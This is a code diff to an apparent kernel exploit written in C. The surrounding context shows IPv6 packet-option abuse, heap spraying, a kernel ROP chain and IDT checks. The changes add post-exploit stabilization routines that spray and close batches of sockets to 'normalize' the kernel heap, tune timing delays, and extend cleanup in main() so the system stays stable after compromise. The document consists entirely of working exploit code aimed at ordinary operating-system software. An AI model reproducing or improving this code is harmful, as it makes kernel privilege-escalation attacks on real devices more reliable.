@@ -27,10 +27,12 @@
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0"
 #define NANOSLEEP_75US "\0\0\0\0\0\0\0\0\x38\x2a\x01\0\0\0\0\0"
 #define NANOSLEEP_50US "\0\0\0\0\0\0\0\0\x88\x13\0\0\0\0\0\0"
+#define NANOSLEEP_10MS "\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0"
 
 #define MAX_ATTEMPTS 10
 #define HEAP_GROOM_COUNT 100
 #define SOCKET_CLEANUP_RETRIES 5
+#define STABILIZATION_PASSES 3
 
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
@@ -267,6 +269,66 @@ void iterative_socket_cleanup(int sock) {
     }
 }
 
+// Stabilize kernel memory after successful exploit
+void stabilize_kernel_memory() {
+    int i, j;
+    int stabilization_sockets[64];
+    
+    // Multi-pass stabilization
+    for (j = 0; j < STABILIZATION_PASSES; j++) {
+        // Create temporary sockets to normalize heap
+        for (i = 0; i < 64; i++) {
+            stabilization_sockets[i] = new_socket();
+            if (stabilization_sockets[i] >= 0) {
+                reset_ipv6_opts(stabilization_sockets[i]);
+            }
+        }
+        
+        nanosleep(NANOSLEEP_100US, NULL);
+        
+        // Close sockets in reverse order for better heap cleanup
+        for (i = 63; i >= 0; i--) {
+            if (stabilization_sockets[i] >= 0) {
+                shutdown(stabilization_sockets[i], SHUT_RDWR);
+                close(stabilization_sockets[i]);
+            }
+        }
+        
+        nanosleep(NANOSLEEP_100US, NULL);
+    }
+}
+
+// Perform comprehensive cleanup of all spray sockets
+void cleanup_spray_sockets(int* spray_sock, int count) {
+    int i;
+    
+    // Reset all socket options first
+    for (i = 0; i < count; i++) {
+        if (spray_sock[i] >= 0) {
+            reset_ipv6_opts(spray_sock[i]);
+        }
+    }
+    
+    nanosleep(NANOSLEEP_75US, NULL);
+    
+    // Shutdown connections
+    for (i = 0; i < count; i++) {
+        if (spray_sock[i] >= 0) {
+            shutdown(spray_sock[i], SHUT_RDWR);
+        }
+    }
+    
+    nanosleep(NANOSLEEP_75US, NULL);
+    
+    // Close sockets
+    for (i = 0; i < count; i++) {
+        if (spray_sock[i] >= 0) {
+            close(spray_sock[i]);
+            spray_sock[i] = -1;
+        }
+    }
+}
+
 void (*enter_krop)(void);
 extern uint64_t krop_idt_base;
 extern uint64_t krop_jmp_crash;
@@ -431,5 +493,36 @@ int main() {
 
     nanosleep(NANOSLEEP_50US, NULL);
 
+    if (!idt_check(idt_base)) {
+        return 1; // IDT corrupted, abort
+    }
+    
+    iterative_socket_cleanup(master_sock);
+    nanosleep(NANOSLEEP_100US, NULL);
+    
+    if (kevent_sock >= 0) {
+        reset_ipv6_opts(kevent_sock);
+        shutdown(kevent_sock, SHUT_RDWR);
+        close(kevent_sock);
+    }
+    
+    nanosleep(NANOSLEEP_100US, NULL);
+    
+    cleanup_spray_sockets(spray_sock, SPRAY_TOTAL);
+    nanosleep(NANOSLEEP_10MS, NULL);
+    
+    stabilize_kernel_memory();
+    nanosleep(NANOSLEEP_10MS, NULL);
+    
+    if (!idt_check(idt_base)) {
+        return 2;
+    }
+    
+    if (spray_map != MAP_FAILED) {
+        munmap(spray_map, spray_size);
+    }
+    
+    nanosleep(NANOSLEEP_10MS, NULL);
+    
     return 0;
 }
